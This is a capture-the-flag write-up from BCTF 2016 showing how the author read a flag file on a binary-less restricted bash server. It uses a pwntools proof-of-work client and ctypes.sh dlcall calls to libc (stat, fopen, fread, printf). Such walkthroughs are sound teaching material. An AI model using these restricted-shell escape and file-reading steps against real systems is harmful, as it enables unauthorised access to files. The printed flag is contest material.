---
id: 654
title: 'BCTF 2016 - HSAB - Misc Category Challenge'
date: 2016-03-21T04:58:04+00:00
author: Kris
layout: post
guid: https://ctf.rip/?p=654
permalink: /bctf-2016-hsab-misc-category-challenge/
themepixels_post_link_target:
  - 'yes'
themepixels_enable_post_header:
  - default
themepixels_enable_post_meta_single:
  - default
themepixels_enable_post_featured_content:
  - default
themepixels_enable_post_categories:
  - default
themepixels_enable_post_tags:
  - default
themepixels_enable_post_share:
  - default
themepixels_enable_post_author_info_box:
  - default
themepixels_enable_related_posts:
  - default
themepixels_enable_post_next_prev_links:
  - default
themepixels_enable_topbar:
  - default
themepixels_enable_sticky_header:
  - default
themepixels_header_layout:
  - default
themepixels_site_layout:
  - default
themepixels_sidebar_position:
  - default
post_views_count:
  - "1514"
image: /images/2016/03/hsab.png
categories:
  - Write-Ups
tags:
  - bash
  - bctf
  - ctypes.sh
  - misc
---
What a fun challenge. I've heard of some very simple solutions after I solved it but I'm fairly certain this way is the intended solution.

We're given a server we can connect to (after solving a proof of work) that just drops us at a bash command prompt. There's very little to the clue, in fact, no text, just a name "hsab" and a IP and port to connect to so nothing else there.

First thing we find out is that there's no binaries on the server. So no `ls` no `cat`. You have `bash` and that's it. You also get dropped very quickly, like you have about 10 seconds then you get booted off.

I quickly hack this client together to try somethings:

```
#!/usr/bin/python

from pwn import *
import string
import hashlib
import itertools

host = '104.199.132.199'
port = 2222

while True:
    try:
        conn = remote(host,port)
        chall = conn.recvline().split('\'')[1]
        print "[*] Connecting - challenge: " + chall
        for i in itertools.product(string.ascii_letters + string.digits, repeat=7):
            attempt = ''.join(i)

            ha = hashlib.sha256()
            ha.update(chall + attempt)

            if ha.hexdigest().startswith("00000"):
                break

        conn.sendline(chall + attempt)
        conn.interactive()
    except KeyboardInterrupt:
        conn.close()
        pass
```



We can do a rudimentary listing of the filesystem with `echo *` and we find that the flag is most likely in the `/home/ctf/flag.ray` file.

```
root@kali:~/bctf/misc/hsab# ./hsab.py 
[+] Opening connection to 104.199.132.199 on port 2222: Done
[*] Connecting - challenge: kosdnoms
[*] Switching to interactive mode
-bash-4.4$ $ echo /*
/bin /dev /etc /home /lib /lib64 /proc /run /sys /usr
-bash-4.4$ $ echo home/*
home/ctf
-bash-4.4$ $ echo home/ctf/*
home/ctf/flag.ray
-bash-4.4$ $ echo bin/*
bin/bash bin/server
-bash-4.4$ $ echo usr/bin/*
usr/bin/bash usr/bin/server
-bash-4.4$ 
server: timeout
```

Ok so no software and need to read a file. Is the file even readable? We don't know! I begin to research "bash builtins" looking for a flag that will cat our file. On a whim I checked the environment with "set":

```
-bash-4.4$ $ set
BASH=/bin/bash
BASHOPTS=cmdhist:complete_fullquote:expand_aliases:extquote:force_fignore:hostcomplete:interactive_comments:login_shell:promptvars:sourcepath
...
RTLD_DEFAULT=0x0
RTLD_NEXT=0x-1
...
TERM=dumb
UID=1000
_=:
builtins=([0]="callback" [1]="dlcall" [2]="dlclose" [3]="dlopen" [4]="dlsym" [5]="pack" [6]="unpack")
```

Hmm what's this in the builtin's array in the environment? A quick google search turns up this which I recall reading when Tavis posted it a little while back: <a href="https://github.com/taviso/ctypes.sh/wiki" target="_blank">https://github.com/taviso/ctypes.sh/wiki</a>

So it appears that ctypes.sh plugin may be loaded into this shell? Let's do the "Hello world" test:

```
-bash-4.4$ $ dlcall puts "Hello, World"
Hello, World
```

Ok cool. So basically we can use dynamic library functions on this bash command line. libc seems to already be loaded so we map out what we need to do:

  * Is the flag readable? If so
  * fopen the /home/ctf/flag.ray and get a file handle
  * malloc a buffer
  * fread from the file handle into our buffer
  * printf the output

Let's check #1 - is the flag readable? Tavis gives us a "stat" example so lets use his example!

```
dlcall -n statbuf -r pointer malloc 1024
declare -a stat
{
    unset n
    stat[st_dev     = n++]="long"
    stat[st_ino     = n++]="long"
    stat[st_nlink   = n++]="long"
    stat[st_mode    = n++]="int"
    stat[st_uid     = n++]="int"
    stat[st_gid     = n++]="int"
    stat[             n++]="int"
    stat[st_rdev    = n++]="long"
    stat[st_size    = n++]="long"
    stat[st_blksize = n++]="long"
    stat[st_blocks  = n++]="long"
}
dlcall __xstat 0 "/home/ctf/flag.ray" $statbuf
unpack $statbuf stat
printf "/home/ctf/flag.ray\n"
printf "\tuid:  %u\n" ${stat[st_uid]##*:}
printf "\tgid:  %u\n" ${stat[st_gid]##*:}
printf "\tmode: %o\n" ${stat[st_mode]##*:}
printf "\tsize: %u\n" ${stat[st_size]##*:}
dlcall free $statbuf
```



I just paste it straight in at the prompt  <img src="https://ctf.rip/images/classic-smilies/icon_smile.gif" alt=":)" class="wp-smiley" style="height: 1em; max-height: 1em;" />The important part of the result is:

```
-bash-4.4$ printf "\tmode: %o\n" ${stat[st_mode]##*:}
    mode: 100644
```

Phew we don't have to escalate privs the file is mode 0644! Let's begin reading it. Here's the code I came up with after struggling with syntax for a short while:

```
dlcall -n fd -r pointer fopen "/home/ctf/flag.ray" "r"
dlcall -n flagbuf -r pointer malloc 1024
dlcall -n flagbuf fread $flagbuf 1024 1 $fd
dlcall printf "%s" $flagbuf
```

And when we paste that in we're rewarded with the flag:

```
-bash-4.4$ $ dlcall -n fd -r pointer fopen "/home/ctf/flag.ray" "r"
pointer:0x1696be0
-bash-4.4$ dlcall -n flagbuf -r pointer malloc 1024
pointer:0x1697240
-bash-4.4$ dlcall -n flagbuf fread $flagbuf 1024 1 $fd
-bash-4.4$ dlcall printf "%s" $flagbuf
#BCTF{ipreferzshtobash}
-bash-4.4$ 
server: timeout
```